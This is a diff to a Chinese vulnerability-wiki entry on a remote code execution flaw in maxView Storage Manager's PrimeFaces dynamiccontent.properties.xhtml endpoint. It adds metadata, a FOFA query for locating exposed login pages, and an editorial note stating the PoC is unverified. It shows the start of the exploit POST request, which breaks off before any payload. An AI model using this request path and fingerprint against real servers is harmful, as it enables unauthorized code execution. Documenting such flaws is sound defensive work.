@@ -1,9 +1,49 @@
 ---
-fofa: "title="
+fofa: "title=\"maxView Storage Manager -Login\""
 source: "wy876 漏洞文库"
+title: "maxView Storage Manager 系统 dynamiccontent.properties.xhtml 远程代码执行漏洞"
+product: "Adaptec maxView Storage Manager / PrimeFaces组件"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "适用PrimeFaces动态资源处理与密钥/配置，鉴权及具体版本缺失"
+source_status: "unknown"
+side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
+id: "vw-6aa33710e7605e6fa4a34d2a"
+entity_id: "ve-6aa33710e7605e6fa4a34d2a"
+schema_version: "1"
 ---
 
 # maxView Storage Manager 系统 dynamiccontent.properties.xhtml 远程代码执行漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：适用PrimeFaces动态资源处理与密钥/配置，鉴权及具体版本缺失
+- 证据范围：只有长不透明pfdrid及cmd参数，无载荷生成过程、解码或响应证据；已全文读原始字符串，未解密/运行
+
+### 本次正文校订
+
+- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。
+- 从本文明确展示的查询恢复完整 FOFA 元数据；资产指纹只用于识别，不是漏洞命中证据。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 影响版本仅产品名
+- 不透明固定载荷的适用版本/加密条件及预期行为未解释
+- Host空，结果证据缺失，不能凭请求认定成功
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 # 一、漏洞简介
 maxView Storage Manager 是一款企业存储和通信解决方案的管理系统。maxView Storage Manager 存在代码执行漏洞，攻击者可通过 dynamiccontent.properties.xhtml 执行任意代码获取服务器权限。 
@@ -17,7 +57,7 @@ maxView Storage Manager 是一款企业存储和通信解决方案的管理系�
 
 
 # 四、漏洞复现
-```plain
+```http
 POST /maxview/manager/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
